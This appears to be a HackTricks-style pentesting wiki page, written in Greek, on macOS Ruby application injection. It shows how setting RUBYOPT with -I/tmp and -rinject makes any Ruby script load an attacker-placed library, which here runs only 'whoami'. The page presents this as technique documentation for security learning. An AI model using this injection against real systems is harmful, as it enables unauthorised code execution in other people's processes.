# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Χρησιμοποιώντας αυτή τη μεταβλητή περιβάλλοντος, είναι δυνατό να **προστεθούν νέες παράμετροι** στο **ruby** κάθε φορά που εκτελείται. Παρόλο που η παράμετρος **`-e`** δεν μπορεί να χρησιμοποιηθεί για τον καθορισμό κώδικα ruby προς εκτέλεση, είναι δυνατό να χρησιμοποιηθούν οι παράμετροι **`-I`** και **`-r`** για την προσθήκη ενός νέου φακέλου στη διαδρομή φόρτωσης των libraries και, στη συνέχεια, να **καθοριστεί ένα library προς φόρτωση**.

Δημιουργήστε το library **`inject.rb`** στο **`/tmp`**:
```ruby:inject.rb
puts `whoami`
```
Δημιουργήστε οπουδήποτε ένα Ruby script όπως:
```ruby:hello.rb
puts 'Hello, World!'
```
Στη συνέχεια, κάντε ένα αυθαίρετο ruby script να το φορτώσει με:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Ενδιαφέρον γεγονός, λειτουργεί ακόμη και με την παράμετρο **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
